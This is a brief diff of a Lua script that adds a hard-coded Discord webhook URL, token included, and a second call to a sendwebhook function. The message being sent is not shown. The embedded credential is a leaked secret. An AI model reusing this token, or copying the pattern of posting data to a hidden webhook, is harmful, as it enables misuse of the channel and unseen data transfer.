@@ -51,3 +51,7 @@ local function sendwebhook(msg)
 end
 
 sendwebhook(msg)
+
+local Webhook = "https://discord.com/api/webhooks/1121783169490894878/VXFhSJFYyHJ2kUS006gqUxzCC5Amuqrhkdos6ekIOyxcPBjQ8hEc7cBMAa3igjiukD_X"
+
+sendwebhook(msg)
